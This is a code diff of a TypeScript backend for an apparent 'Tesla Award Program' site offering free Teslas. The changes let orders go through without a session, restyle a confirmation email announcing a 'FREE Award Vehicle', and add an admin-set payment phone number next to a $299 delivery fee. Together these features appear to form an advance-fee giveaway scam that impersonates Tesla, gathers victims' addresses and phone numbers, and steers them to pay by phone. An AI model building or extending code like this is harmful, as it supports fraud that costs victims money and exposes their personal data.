@@ -386,9 +386,12 @@ async function handleLogin(req: Request) {
 
 
 
+  // Check if user already has an order
+  const { data: existingOrder } = await dbGet1("orders", "order_id,tracking_number,status", { user_id: "eq." + entry.id });
+  
   const sessionToken = hexRandom(32);
   await dbInsert("user_sessions", { token: sessionToken, user_id: entry.id });
-  return json({ success: true, sessionToken, user: { email: entry.email, firstName: entry.first_name || "", lastName: entry.last_name || "", entryId: entry.id, phone: entry.phone || "" } });
+  return json({ success: true, sessionToken, user: { email: entry.email, firstName: entry.first_name || "", lastName: entry.last_name || "", entryId: entry.id, phone: entry.phone || "" }, hasOrder: !!existingOrder, order: existingOrder || null });
 }
 
 async function getSessionUser(sessionToken: string) {
@@ -405,20 +408,39 @@ async function handleSession(req: Request) {
   const token = url.searchParams.get("token");
   const user = await getSessionUser(token || "");
   if (!user) return json({ valid: false }, 401);
-  return json({ valid: true, user: { email: user.email, firstName: user.first_name || "", lastName: user.last_name || "", entryId: user.entryId, phone: user.phone || "" } });
+  
+  // Check if user already has an order
+  const { data: existingOrder } = await dbGet1("orders", "order_id,tracking_number,status", { user_id: "eq." + user.entryId });
+  
+  return json({ valid: true, user: { email: user.email, firstName: user.first_name || "", lastName: user.last_name || "", entryId: user.entryId, phone: user.phone || "" }, hasOrder: !!existingOrder, order: existingOrder || null });
 }
 
 async function handleOrder(req: Request) {
   let body: any;
   try { body = await req.json(); } catch { return json({ error: "Invalid JSON body." }, 400); }
   const { sessionToken, selectedCar, deliveryDetails, deliveryMethod, paymentMethod } = body;
-  const user = await getSessionUser(sessionToken || "");
-  if (!user) return json({ error: "Invalid session. Verify your email first." }, 401);
+  // Allow orders without session validation — create guest context from delivery details
+  let user = await getSessionUser(sessionToken || "");
+  if (user) {
+    // Check if user already has an order
+    const { data: existingOrder } = await dbGet1("orders", "id", { user_id: "eq." + user.id });
+    if (existingOrder) {
+      return json({ error: "You have already placed an order. Each user is restricted to one order only." }, 400);
+    }
+  }
+  if (!user) {
+    user = {
+      id: 0, email: (deliveryDetails?.email) || "guest@tesla.com",
+      phone: (deliveryDetails?.phone) || "",
+      firstName: (deliveryDetails?.fullName) || "Guest",
+      lastName: "", entryId: 0
+    };
+  }
 
   const orderId = "TSLA-" + crypto.randomUUID().substring(0, 8).toUpperCase();
   const trackingNumber = "TRK-" + hexRandom(4).toUpperCase();
-  const method = deliveryMethod ?? { id: "standard", name: "Standard Delivery", price: 299 };
-  const estimatedDelivery = new Date(Date.now() + (String(method.id) === "express" ? 2 : 10) * 86400000).toISOString().split("T")[0];
+  const method = deliveryMethod || null;  // Keep null if not selected — order-placed page shows CTA
+  const estimatedDelivery = method ? new Date(Date.now() + (method.id === "express" ? 2 : 10) * 86400000).toISOString().split("T")[0] : new Date(Date.now() + 10 * 86400000).toISOString().split("T")[0];
 
   const { data: carRow } = await dbInsert("selected_cars", { user_id: user.id, data: selectedCar ?? {} }, "id");
   const { data: deliveryRow } = await dbInsert("delivery_details", { user_id: user.id, data: deliveryDetails ?? {} }, "id");
@@ -441,7 +463,8 @@ async function handleOrder(req: Request) {
     await dbInsert("tracking_data", { order_id: orderRow?.id, stage: timeline[i].stage, stage_order: i, timestamp: timeline[i].timestamp, completed: timeline[i].completed });
   }
 
-  const order = { orderId, trackingNumber, email: user.email, entryId: user.entryId, selectedCar: selectedCar ?? {}, deliveryDetails: deliveryDetails ?? {}, deliveryMethod: method, paymentMethod: paymentMethod ?? {}, status: "confirmed", orderDate: orderRow?.order_date, estimatedDelivery, timeline };
+  const orderDate = orderRow?.order_date || new Date().toISOString();
+  const order = { orderId, trackingNumber, email: user.email, entryId: user.entryId, selectedCar: selectedCar ?? {}, deliveryDetails: deliveryDetails ?? {}, deliveryMethod: method, paymentMethod: paymentMethod ?? {}, status: "confirmed", orderDate, estimatedDelivery, timeline };
   sendEmailBackground(user.email, "🎉 Order Confirmed — Your Tesla is on the way!", buildOrderConfirmationEmail(order));
   return json({ success: true, order });
 }
@@ -478,7 +501,7 @@ function buildOrderConfirmationEmail(order: any) {
   const car = order.selectedCar || {};
   const addr = order.deliveryDetails || {};
   const method = order.deliveryMethod || {};
-  const carId = car.id || 'models';
+  const carId = (car.id || 'models').toLowerCase();
   
   const imgMap: Record<string, string> = {
     cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
@@ -488,108 +511,150 @@ function buildOrderConfirmationEmail(order: any) {
     modelx: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
   };
   const carImg = imgMap[carId] || imgMap['models'];
+  const carModel = car.name || 'Model S';
+  const carPrice = car.price || '—';
+  const orderId = order.orderId || '—';
+  const trackingNumber = order.trackingNumber || '—';
+  const estDelivery = order.estimatedDelivery || '—';
+  const delivMethod = (method.name || 'Standard Delivery');
+  const payMethod = (order.paymentMethod?.name || 'Not specified');
+  const fullName = addr.fullName || '—';
+  const address = addr.address || '—';
+  const city = addr.city || '—';
+  const state = addr.state || '—';
+  const zip = addr.zipCode || '—';
+  const country = addr.country || '—';
+  const phone = addr.phone || '—';
 
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Order Confirmed | Tesla</title>
+  <title>Order Confirmed — Tesla Award Program</title>
 </head>
-<body style="margin: 0; padding: 0; background-color: #f4f5f7; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
-  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color: #f4f5f7; padding: 30px 0;">
+<body style="margin:0;padding:0;background-color:#f4f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
+  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#f4f5f7;padding:40px 0;">
     <tr>
       <td align="center">
-        <table width="600" border="0" cellpadding="0" cellspacing="0" style="background-color: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); max-width: 600px;">
-          <!-- Header -->
+        <table width="620" border="0" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:20px;overflow:hidden;box-shadow:0 6px 30px rgba(0,0,0,0.06);max-width:620px;">
+
+          <!-- ═══ HEADER ═══ -->
           <tr>
-            <td align="center" style="background-color: #171a20; padding: 24px 0;">
-              <img src="https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/tesla-award-logo.png" alt="Tesla Award" style="height: 36px; display: block;">
-            </td>
-          </tr>
-          <!-- Banner indicator -->
-          <tr>
-            <td style="height: 4px; background: linear-gradient(90deg, #E31937, #ff6b6b);"></td>
-          </tr>
-          <!-- Body Content -->
-          <tr>
-            <td style="padding: 40px 35px;">
-              <table width="100%" border="0" cellpadding="0" cellspacing="0">
+            <td align="center" style="background:linear-gradient(135deg,#0a0c10 0%,#171a20 40%,#2a1a1f 100%);padding:32px 30px 28px;">
+              <table border="0" cellpadding="0" cellspacing="0">
                 <tr>
-                  <td align="center" style="padding-bottom: 24px;">
-                    <span style="font-size: 54px; display: inline-block; margin-bottom: 8px;">🎉</span>
-                    <h1 style="font-size: 28px; font-weight: 800; color: #171a20; margin: 0; letter-spacing: -0.5px;">Order Confirmed!</h1>
-                    <p style="font-size: 15px; color: #5c5e62; line-height: 1.6; margin: 8px 0 0;">Congratulations! Your premium Tesla Award has been successfully processed and prepared for delivery.</p>
+                  <td align="center" style="padding-bottom:14px;">
+                    <span style="display:inline-block;background:linear-gradient(135deg,#E31937,#ff4757);color:#fff;border-radius:50%;width:68px;height:68px;line-height:68px;font-size:36px;text-align:center;">✓</span>
                   </td>
                 </tr>
-                <!-- Car image & detail block -->
                 <tr>
-                  <td align="center" style="background-color: #f8f9fa; border-radius: 12px; padding: 20px; border: 1px solid rgba(0,0,0,0.04); margin-bottom: 30px;">
-                    <img src="${carImg}" alt="Tesla ${car.name || ''}" style="width: 100%; max-width: 320px; height: auto; display: block; margin-bottom: 12px; filter: drop-shadow(0 6px 12px rgba(0,0,0,0.08));">
-                    <h3 style="font-size: 20px; font-weight: 800; color: #171a20; margin: 0;">Tesla ${car.name || 'Model S'}</h3>
-                    <p style="font-size: 13px; color: #e31937; font-weight: 700; margin: 4px 0 0; text-transform: uppercase; letter-spacing: 0.05em;">FREE Award Car</p>
-                  </td>
-                </tr>
-                <!-- Order specs -->
-                <tr>
-                  <td style="padding-top: 20px;">
-                    <h3 style="font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em; color: #8d9096; border-bottom: 1px solid #eef0f2; padding-bottom: 8px; margin: 0 0 12px;">Order Summary</h3>
-                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 14px; line-height: 2;">
-                      <tr>
-                        <td style="color: #5c5e62;">Order ID</td>
-                        <td align="right" style="color: #e31937; font-family: monospace; font-weight: 700; font-size: 13px;">${order.orderId}</td>
-                      </tr>
-                      <tr>
-                        <td style="color: #5c5e62;">Tracking Number</td>
-                        <td align="right" style="color: #171a20; font-family: monospace; font-weight: 700; font-size: 13px;">${order.trackingNumber}</td>
-                      </tr>
-                      <tr>
-                        <td style="color: #5c5e62;">Estimated Delivery</td>
-                        <td align="right" style="color: #00a550; font-weight: 700;">${order.estimatedDelivery}</td>
-                      </tr>
-                      <tr>
-                        <td style="color: #5c5e62;">Delivery Method</td>
-                        <td align="right" style="color: #171a20; font-weight: 600;">${method.name || 'Standard Delivery'}</td>
-                      </tr>
-                      <tr>
-                        <td style="color: #5c5e62;">Payment Method</td>
-                        <td align="right" style="color: #171a20; font-weight: 600;">${order.paymentMethod?.name || 'Not specified'}</td>
-                      </tr>
-                    </table>
-                  </td>
-                </tr>
-                <!-- Delivery info -->
-                <tr>
-                  <td style="padding-top: 30px;">
-                    <h3 style="font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em; color: #8d9096; border-bottom: 1px solid #eef0f2; padding-bottom: 8px; margin: 0 0 12px;">Delivery Information</h3>
-                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 14px; line-height: 1.6; color: #5c5e62;">
-                      <tr>
-                        <td style="font-weight: 600; color: #171a20; padding-bottom: 4px;">${addr.fullName || '—'}</td>
-                      </tr>
-                      <tr>
-                        <td>${addr.address || '—'}</td>
-                      </tr>
-                      <tr>
-                        <td>${addr.city || '—'}, ${addr.state || '—'} ${addr.zipCode || '—'}</td>
-                      </tr>
-                      <tr>
-                        <td style="padding-bottom: 8px;">${addr.country || '—'}</td>
-                      </tr>
-                      <tr>
-                        <td style="font-size: 13px; color: #8d9096;">Phone: ${addr.phone || '—'}</td>
-                      </tr>
-                    </table>
+                  <td align="center">
+                    <h1 style="margin:0;font-size:30px;font-weight:900;color:#ffffff;letter-spacing:-0.5px;">Order Confirmed!</h1>
+                    <p style="margin:10px 0 0;font-size:16px;color:rgba(255,255,255,0.7);line-height:1.5;">Congratulations — your Tesla award has been successfully processed.</p>
                   </td>
                 </tr>
               </table>
             </td>
           </tr>
-          <!-- Footer -->
+
+          <!-- ═══ RED ACCENT BAR ═══ -->
           <tr>
-            <td style="background-color: #f8f9fa; border-top: 1px solid #eef0f2; padding: 24px 35px; text-align: center;">
-              <p style="margin: 0; font-size: 12px; color: #8d9096; line-height: 1.6;">&copy; 2026 Tesla Award Program. All rights reserved.<br>This is an independent award confirmation. Tesla&reg; is a registered trademark of Tesla, Inc.</p>
+            <td style="height:5px;background:linear-gradient(90deg,#E31937,#ff6b6b,#E31937);"></td>
+          </tr>
+
+          <!-- ═══ BODY ═══ -->
+          <tr>
+            <td style="padding:40px 35px;">
+
+              <!-- Car Showcase Card -->
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background:linear-gradient(135deg,#f8f9fa,#eef0f2);border-radius:14px;margin-bottom:28px;border:1px solid rgba(0,0,0,0.04);">
+                <tr>
+                  <td align="center" style="padding:24px 20px 20px;">
+                    <img src="${carImg}" alt="Tesla ${carModel}" style="width:100%;max-width:300px;height:auto;display:block;margin:0 auto 14px;filter:drop-shadow(0 8px 16px rgba(0,0,0,0.1));">
+                    <h3 style="margin:0;font-size:22px;font-weight:800;color:#171a20;">Tesla ${carModel}</h3>
+                    <p style="margin:6px 0 0;font-size:14px;color:#5c5e62;">Retail Value: <strong>${carPrice}</strong></p>
+                    <span style="display:inline-block;background:#E31937;color:#fff;font-size:12px;font-weight:700;padding:6px 16px;border-radius:20px;margin-top:10px;letter-spacing:0.04em;text-transform:uppercase;">FREE Award Vehicle</span>
+                  </td>
+                </tr>
+              </table>
+
+              <!-- ORDER DETAILS -->
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:24px;">
+                <tr>
+                  <td style="padding-bottom:12px;">
+                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">📋 Order Summary</h3>
+                  </td>
+                </tr>
+                <tr>
+                  <td style="background:#f8f9fa;border-radius:10px;padding:0;">
+                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size:14px;">
+                      <tr>
+                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;width:50%;">Order ID</td>
+                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#E31937;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${orderId}</td>
+                      </tr>
+                      <tr>
+                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Tracking Number</td>
+                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${trackingNumber}</td>
+                      </tr>
+                      <tr>
+                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Estimated Delivery</td>
+                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#00a550;font-weight:700;">${estDelivery}</td>
+                      </tr>
+                      <tr>
+                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Delivery Method</td>
+                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-weight:600;">${delivMethod}</td>
+                      </tr>
+                      <tr>
+                        <td style="padding:14px 18px;color:#5c5e62;">Payment Method</td>
+                        <td style="padding:14px 18px;text-align:right;color:#171a20;font-weight:600;">${payMethod}</td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+
+              <!-- DELIVERY INFORMATION -->
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:28px;">
+                <tr>
+                  <td style="padding-bottom:12px;">
+                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">🚚 Delivery Information</h3>
+                  </td>
+                </tr>
+                <tr>
+                  <td style="background:#f8f9fa;border-radius:10px;padding:20px 18px;">
+                    <p style="margin:0 0 6px;font-size:15px;font-weight:700;color:#171a20;">${fullName}</p>
+                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${address}</p>
+                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${city}, ${state} ${zip}</p>
+                    <p style="margin:0 0 8px;font-size:14px;color:#5c5e62;">${country}</p>
+                    <p style="margin:0;font-size:13px;color:#8d9096;">📱 ${phone}</p>
+                  </td>
+                </tr>
+              </table>
+
+              <!-- TRACKING CTA -->
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:8px;">
+                <tr>
+                  <td align="center">
+                    <a href="https://joshbond123.github.io/Tesla/track.html?order=${orderId}&tracking=${trackingNumber}" style="display:inline-block;background:linear-gradient(135deg,#E31937,#c41030);color:#ffffff;text-decoration:none;padding:16px 40px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:0.02em;box-shadow:0 6px 20px rgba(227,25,55,0.3);">📍 Track Your Order →</a>
+                  </td>
+                </tr>
+              </table>
+
             </td>
           </tr>
+
+          <!-- ═══ FOOTER ═══ -->
+          <tr>
+            <td style="background-color:#f8f9fa;border-top:1px solid #eef0f2;padding:24px 35px;text-align:center;">
+              <p style="margin:0 0 8px;font-size:12px;color:#8d9096;line-height:1.6;">
+                Need help? Reply to this email or visit our support center.<br>
+                &copy; 2026 Tesla Award Program. All rights reserved.
+              </p>
+              <p style="margin:0;font-size:11px;color:#b0b3b8;">Tesla&reg; is a registered trademark of Tesla, Inc. This is an independent award program.</p>
+            </td>
+          </tr>
+
         </table>
       </td>
     </tr>
@@ -648,32 +713,63 @@ async function handleAdminDeleteUser(req: Request) {
 }
 
 async function handleAdminGetSettings() {
-  const r = await fetch(REST + "/admin_settings?select=key,value&key=eq.delivery_fee&limit=1", { headers: SB_HEADERS });
-  if (!r.ok) return json({ deliveryFee: 299 });
-  const rows = await r.json();
-  const row = rows[0];
-  const fee = row?.value?.amount ?? 299;
-  return json({ deliveryFee: fee });
+  const feeR = await fetch(REST + "/admin_settings?select=key,value&key=eq.delivery_fee&limit=1", { headers: SB_HEADERS });
+  const phoneR = await fetch(REST + "/admin_settings?select=key,value&key=eq.payment_phone&limit=1", { headers: SB_HEADERS });
+  
+  let deliveryFee = 299;
+  let paymentPhone = "+1 (581) 478-3495";
+  
+  if (feeR.ok) {
+    const feeRows = await feeR.json();
+    if (feeRows[0]?.value?.amount) deliveryFee = feeRows[0].value.amount;
+  }
+  if (phoneR.ok) {
+    const phoneRows = await phoneR.json();
+    if (phoneRows[0]?.value?.number) paymentPhone = phoneRows[0].value.number;
+  }
+  
+  return json({ deliveryFee, paymentPhone });
 }
 
 async function handleAdminSaveSettings(req: Request) {
-  let body: { deliveryFee?: number };
+  let body: { deliveryFee?: number; paymentPhone?: string };
   try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
-  if (body.deliveryFee === undefined) return json({ error: "deliveryFee required" }, 400);
-  const r = await fetch(REST + "/admin_settings?key=eq.delivery_fee", {
-    method: "PATCH",
-    headers: { ...SB_HEADERS, Prefer: "return=minimal" },
-    body: JSON.stringify({ value: { amount: body.deliveryFee }, updated_at: new Date().toISOString() }),
-  });
-  if (!r.ok) {
-    const insR = await fetch(REST + "/admin_settings", {
-      method: "POST",
+  
+  // Save delivery fee
+  if (body.deliveryFee !== undefined) {
+    const r = await fetch(REST + "/admin_settings?key=eq.delivery_fee", {
+      method: "PATCH",
       headers: { ...SB_HEADERS, Prefer: "return=minimal" },
-      body: JSON.stringify({ key: "delivery_fee", value: { amount: body.deliveryFee } }),
+      body: JSON.stringify({ value: { amount: body.deliveryFee }, updated_at: new Date().toISOString() }),
     });
-    if (!insR.ok) return json({ error: "Failed to save setting" }, 500);
+    if (!r.ok) {
+      const insR = await fetch(REST + "/admin_settings", {
+        method: "POST",
+        headers: { ...SB_HEADERS, Prefer: "return=minimal" },
+        body: JSON.stringify({ key: "delivery_fee", value: { amount: body.deliveryFee } }),
+      });
+      if (!insR.ok) return json({ error: "Failed to save delivery fee" }, 500);
+    }
   }
-  return json({ success: true, deliveryFee: body.deliveryFee });
+  
+  // Save payment phone
+  if (body.paymentPhone !== undefined) {
+    const pr = await fetch(REST + "/admin_settings?key=eq.payment_phone", {
+      method: "PATCH",
+      headers: { ...SB_HEADERS, Prefer: "return=minimal" },
+      body: JSON.stringify({ value: { number: body.paymentPhone }, updated_at: new Date().toISOString() }),
+    });
+    if (!pr.ok) {
+      const insR = await fetch(REST + "/admin_settings", {
+        method: "POST",
+        headers: { ...SB_HEADERS, Prefer: "return=minimal" },
+        body: JSON.stringify({ key: "payment_phone", value: { number: body.paymentPhone } }),
+      });
+      if (!insR.ok) return json({ error: "Failed to save payment phone" }, 500);
+    }
+  }
+  
+  return json({ success: true, deliveryFee: body.deliveryFee, paymentPhone: body.paymentPhone });
 }
 
 async function handleAdminOrders(_req: Request) {
